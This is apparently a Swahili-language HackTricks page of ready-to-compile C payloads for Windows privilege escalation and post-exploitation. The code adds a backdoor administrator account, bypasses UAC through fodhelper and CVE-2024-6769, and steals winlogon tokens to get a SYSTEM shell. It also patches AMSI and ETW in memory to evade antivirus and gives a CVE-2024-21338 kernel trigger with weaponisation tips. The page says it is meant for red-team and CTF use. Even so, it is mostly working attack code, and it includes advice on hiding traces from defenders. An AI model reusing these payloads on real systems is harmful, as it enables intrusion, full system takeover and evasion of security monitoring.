# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unakusanya **vipande vidogo vya C vinavyojitosheleza** ambavyo ni muhimu wakati wa Windows Local Privilege Escalation au post-exploitation. Kila payload imeundwa ili iwe rahisi **kunakili na kubandika**, inahitaji tu Windows API / C runtime, na inaweza ku-compile kwa `i686-w64-mingw32-gcc` (x86) au `x86_64-w64-mingw32-gcc` (x64).

> ⚠️ Payload hizi zinadhania kuwa process tayari ina privileges za chini zaidi zinazohitajika kutekeleza kitendo hicho (kwa mfano `SeDebugPrivilege`, `SeImpersonatePrivilege`, au context ya medium-integrity kwa UAC bypass). Zimekusudiwa kwa mazingira ya **red-team au CTF** ambapo kutumia vulnerability kumewezesha arbitrary native code execution.

---

## Add local administrator user
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Wakati binary inayoaminika **`fodhelper.exe`** inapotekelezwa, huuliza registry path iliyo hapa chini **bila kuchuja verb ya `DelegateExecute`**. Kwa kuweka command yetu chini ya key hiyo, attacker anaweza kufanya bypass ya UAC *bila kuweka file kwenye disk.*<sup>[[1]](#references)</sup>

*Registry path inayoulizwa na `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PoC ndogo inayofungua `cmd.exe` yenye privileges zilizoinuliwa:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Imejaribiwa kwenye Windows 10 22H2 na Windows 11 23H2 (patch za Julai 2025). Bypass bado inafanya kazi kwa sababu Microsoft haijarekebisha integrity check iliyokosekana kwenye njia ya `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning bado inafanya kazi dhidi ya builds za Windows 10/11 zilizo na patch kwa sababu `ctfmon.exe` huendeshwa kama trusted UI process yenye high integrity, ambayo hupakia kutoka kwenye drive ya `C:` iliyo chini ya impersonation ya caller na kutumia tena DLL redirections zozote ambazo `CSRSS` imehifadhi kwenye cache. Abuse hufanyika hivi: elekeza upya `C:` kwenye storage inayodhibitiwa na attacker, weka `msctf.dll` yenye trojan, zindua `ctfmon.exe` ili kupata high integrity, kisha iombe `CSRSS` ihifadhi manifest inayoredirect DLL inayotumiwa na auto-elevated binary (kwa mfano, `fodhelper.exe`) ili uzinduzi unaofuata urithi payload yako bila UAC prompt.<sup>[[5]](#references)</sup>

Practical workflow:
1. Andaa fake `%SystemRoot%\System32` tree na nakili binary halali unayopanga kuhijack (mara nyingi `ctfmon.exe`).
2. Tumia `DefineDosDevice(DDD_RAW_TARGET_PATH)` ku-remap `C:` ndani ya process yako, huku ukiweka `DDD_NO_BROADCAST_SYSTEM` ili mabadiliko yabaki local.
3. Weka DLL + manifest yako kwenye fake tree, ita `CreateActCtx/ActivateActCtx` kusukuma manifest kwenye activation-context cache, kisha zindua auto-elevated binary ili isolve DLL iliyo-redirect moja kwa moja hadi kwenye shellcode yako.
4. Futa cache entry (`sxstrace ClearCache`) au reboot ukimaliza ili kuondoa attacker fingerprints.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Ushauri wa Cleanup: baada ya kupata SYSTEM, tumia `sxstrace Trace -logfile %TEMP%\sxstrace.etl` ikifuatiwa na `sxstrace Parse` wakati wa testing—ukiona jina la manifest yako kwenye log, defenders wanaweza pia kuliona, kwa hivyo badilisha paths kila run.

---

## Anzisha SYSTEM shell kupitia token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Ikiwa process ya sasa ina privileges zote mbili za **`SeDebug`** na **`SeImpersonate`** (jambo la kawaida kwa service accounts nyingi), unaweza kuiba token kutoka kwa `winlogon.exe`, kuifanya duplicate, na kuanzisha process yenye elevated privileges:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Kwa maelezo ya kina zaidi kuhusu jinsi hiyo inavyofanya kazi, tazama:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Injini nyingi za kisasa za AV/EDR hutegemea **AMSI** na **ETW** kukagua tabia hasidi. Kufanya patch kwenye interfaces zote mbili mapema ndani ya process ya sasa huzuia payloads zinazotegemea scripts (k.m. PowerShell, JScript) kuchanganuliwa.<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Patch iliyo hapo juu ni process-local; kuanzisha PowerShell mpya baada ya kuiendesha kutatekeleza bila ukaguzi wa AMSI/ETW.*

---

## Unda child kama Protected Process Light (PPL)
Omba kiwango cha ulinzi cha PPL kwa child wakati wa creation ukitumia `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Hii ni API iliyoandikwa rasmi na itafanikiwa tu ikiwa target image imesainiwa kwa signer class iliyoombwa (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Viwango vinavyotumika mara nyingi:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Thibitisha matokeo kwa Process Explorer/Process Hacker kwa kuangalia safu ya Protection.

---

## Local Service -> Kernel kupitia `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` huweka wazi kifaa (`\\.\\AppID`) ambacho smart-hash maintenance IOCTL yake hukubali function pointers zinazotolewa na user kila mara caller anapoendesha kama `LOCAL SERVICE`; Lazarus anatumia vibaya hili kuzima PPL na kupakia drivers holela, hivyo red teams zinapaswa kuwa na trigger iliyo tayari kwa matumizi ya lab.<sup>[[6]](#references)</sup>

Maelezo ya kiutendaji:
- Bado unahitaji token ya `LOCAL SERVICE`. Iibe kutoka kwa `Schedule` au `WdiServiceHost` ukitumia `SeImpersonatePrivilege`, kisha impersonate kabla ya kugusa kifaa ili ukaguzi wa ACL upite.
- IOCTL `0x22A018` inatarajia struct yenye callback pointers mbili (query length + read function). Elekeza zote kwenye user-mode stubs zinazounda token overwrite au ku-map ring-0 primitives, lakini weka buffers zikiwa RWX ili KernelPatchGuard isicrash katikati ya chain.
- Baada ya kufanikiwa, toka kwenye impersonation na revert device handle; defenders sasa hutafuta handles zisizotarajiwa za `Device\\AppID`, kwa hivyo ifunge mara tu privilege inapopatikana.

<details>
<summary>C - Skeleton trigger ya kutumia vibaya smart-hash ya `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Marekebisho madogo ya mwisho kwa build yenye weaponized: map section ya RWX kwa kutumia `VirtualAlloc`, nakili token duplication stub yako hapo, weka `KernelThunk = section`, na mara `DeviceIoControl` itakaporudi unapaswa kuwa SYSTEM hata ukiwa chini ya PPL.

---

## Marejeo

- [1] [First entry: Welcome and fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – minimal PPL process launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [UpdateProcThreadAttribute function (Win32 apps) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Novel Exploit Chain Enables Windows UAC Bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus and the FudModule Rootkit: Beyond BYOVD with an Admin-to-Kernel Zero-Day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
